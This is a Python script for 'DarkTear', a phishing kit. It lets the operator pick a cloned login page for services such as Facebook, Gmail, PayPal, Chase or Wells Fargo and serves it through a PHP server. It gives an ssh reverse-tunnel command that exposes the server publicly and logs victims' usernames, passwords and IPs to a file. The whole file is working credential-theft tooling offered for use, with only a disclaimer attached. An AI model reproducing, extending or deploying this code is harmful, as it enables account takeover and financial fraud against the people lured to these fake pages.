#!/usr/bin/env python3
# DarkTear v1.0 - by WastelandX
# MANUAL TUNNEL: user runs localhost.run separately.

import os
import sys
import time
import subprocess
import shutil
import glob
from datetime import datetime

# ========== COLORS ==========
R = '\033[91m'          # Red
B = '\033[96m'          # Electric Blue (for other elements)
DB = '\033[34m'         # Dark Blue (for tunnel logo)
O = '\033[93m'          # Orange
G = '\033[92m'          # Green
Y = '\033[93m'          # Yellow
W = '\033[97m'          # White
RS = '\033[0m'          # Reset

# ========== LOGOS ==========
def show_main_logo():
    os.system('clear' if os.name == 'posix' else 'cls')
    logo = [
        "____    ____   ____   _  __",
        "|  _ \\  / _  | |  _ \\ | |/ /  Made",
        "| | | || | | | | |_) || ' |   By",
        "| |_| || |_| | |  _ < | . \\   WastelandX.",
        "|____/  \\___ | |_|_\\_\\|_|\\_\\",
        "|_   _|| ____| / _  ||  _ \\",
        "  | |  |  _|  | | | || |_) |",
        "  | |  | |___ | |_| ||  _ <",
        "  |_|  |_____| \\___ ||_| \\_\\"
    ]
    colors = [R, B, O]
    for line in logo:
        colored = ""
        for i, ch in enumerate(line):
            if ch == " ":
                colored += " "
            else:
                colored += f"{colors[i % 3]}{ch}"
        print(colored + RS)
    print(f"\n{R}Author is not responsible for any misuse.{RS}")
    print(f"{R}" + "═"*60 + f"{RS}\n")

def show_tunnel_logo():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"{DB}")   # Dark Blue
    print("██████  █████  ██████  ██   ██ ████████ ███████  █████  ██████")
    print("██   ██ ██   ██ ██   ██ ██  ██     ██    ██      ██   ██ ██   ██")
    print("██   ██ ███████ ██████  █████      ██    █████   ███████ ██████")
    print("██████  ██   ██ ██   ██ ██   ██    ██    ███████ ██   ██ ██   ██")
    print(f"{RS}\n")

# ========== PAGE LIST (TWO COLUMNS, with extra spacing) ==========
PAGES = [
    ("01", "Facebook"), ("02", "Instagram"), ("03", "Gmail"),
    ("04", "Netflix"), ("05", "PayPal"), ("06", "GitHub"),
    ("07", "Roblox"), ("08", "Microsoft"), ("09", "Twitter/X"),
    ("10", "Amazon"), ("11", "Snapchat"), ("12", "TikTok"),
    ("13", "LinkedIn"), ("14", "Discord"), ("15", "Steam"),
    ("16", "Apple ID"), ("17", "Yahoo"), ("18", "WhatsApp"),
    ("19", "Spotify"), ("20", "Bank of America"), ("21", "Chase"),
    ("22", "Wells Fargo"), ("23", "IG Business"), ("24", "FB Business"),
    ("25", "Blockman GO"), ("26", "Custom Clone")
]
PAGES_DICT = {p[0]: p[1] for p in PAGES}

def show_page_menu():
    print(f"{B}[ SELECT LOGIN PAGE ]{RS}")
    print(f"{R}" + "═"*60 + f"{RS}")
    half = len(PAGES) // 2
    left = PAGES[:half]
    right = PAGES[half:]
    # Print in two columns with two spaces after each bracket
    for i in range(len(left)):
        l_num, l_name = left[i]
        r_num, r_name = right[i] if i < len(right) else ("", "")
        left_str = f"  {O}[{l_num}]{W}  {l_name:20}{RS}"
        if r_num:
            right_str = f"  {O}[{r_num}]{W}  {r_name}{RS}"
            print(left_str + right_str)
        else:
            print(left_str)
    print(f"\n{R}" + "═"*60 + f"{RS}")

def find_page_file(choice, page_name):
    base_dir = "page"
    if not os.path.isdir(base_dir):
        return None

    candidates = [
        f"{page_name.lower()}.html",
        f"{page_name}.html",
        page_name.lower().replace(" ", "_") + ".html",
        page_name.replace(" ", "_") + ".html",
        page_name.lower().replace(" ", "") + ".html",
        page_name.replace(" ", "") + ".html",
        f"{choice}_{page_name.lower()}.html",
        f"{choice}_{page_name}.html",
    ]

    for cand in candidates:
        full = os.path.join(base_dir, cand)
        if os.path.isfile(full):
            return full

    pattern = os.path.join(base_dir, "*")
    files = glob.glob(pattern)
    for f in files:
        if os.path.basename(f).lower() == page_name.lower() + ".html":
            return f
        if os.path.basename(f).lower() == page_name.lower().replace(" ", "_") + ".html":
            return f
        if os.path.basename(f).lower() == page_name.lower().replace(" ", "") + ".html":
            return f
    return None

# ========== PHP SERVER (always runs) ==========
def start_php_server(port=8080):
    try:
        proc = subprocess.Popen(
            ["php", "-S", f"0.0.0.0:{port}"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        print(f"{G}[+] PHP server running on port {port}{RS}")
        return proc
    except FileNotFoundError:
        print(f"{R}[-] PHP not found. Install PHP first.{RS}")
        return None

# ========== MANUAL TUNNEL HANDLER (localhost.run) ==========
def manual_tunnel_setup():
    """Show instructions for localhost.run and ask for public URL."""
    print(f"\n{Y}[!] MANUAL TUNNEL REQUIRED (localhost.run){RS}")
    print(f"{W}1. Open a new terminal.{RS}")
    print(f"{W}2. Run: {G}ssh -R 80:localhost:8080 localhost.run{RS}")
    print(f"{W}3. Look for the line containing 'https://xxxxx.localhost.run'{RS}")
    print(f"{W}4. Copy that full URL and paste it below.\n{RS}")
    url = input(f"{O}[?]{W} Enter public URL: {RS}").strip()
    return url

# ========== CREDENTIAL LOGGER ==========
def log_credentials(page, username, password, ip="Unknown"):
    os.makedirs("logs", exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("logs/captured.txt", "a") as f:
        f.write(f"\n[{ts}]\nPage: {page}\nIP: {ip}\nUsername: {username}\nPassword: {password}\n{'-'*40}\n")
    print(f"{G}[+] Credentials saved!{RS}")

# ========== MAIN ==========
def main():
    show_main_logo()
    show_page_menu()
    choice = input(f"\n{O}[?]{W} Select page [01-26]: {RS}").strip().zfill(2)

    if choice not in PAGES_DICT:
        print(f"{R}[-] Invalid selection{RS}")
        sys.exit(1)

    page_name = PAGES_DICT[choice]
    html_file = find_page_file(choice, page_name)

    if not html_file:
        print(f"{R}[-] HTML file not found for {page_name}. Check 'page/' folder.{RS}")
        print(f"{Y}[!] Make sure the file exists (e.g., page/discord.html, page/Instagram.html){RS}")
        sys.exit(1)

    print(f"{G}[+] Selected: {page_name}{RS}")
    time.sleep(1)

    show_tunnel_logo()
    shutil.copy(html_file, "index.html")
    print(f"{G}[+] Page copied to index.html{RS}")

    php = start_php_server()
    if not php:
        sys.exit(1)

    # Manual tunnel step
    public_url = manual_tunnel_setup()
    print(f"\n{G}[+] Attack is live at: {DB}{public_url}{RS}")
    print(f"{Y}[!] Press Ctrl+C to stop the attack{RS}\n")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Shutting down...{RS}")
        php.terminate()
        print(f"{G}[+] DarkTear stopped{RS}")

if __name__ == "__main__":
    main()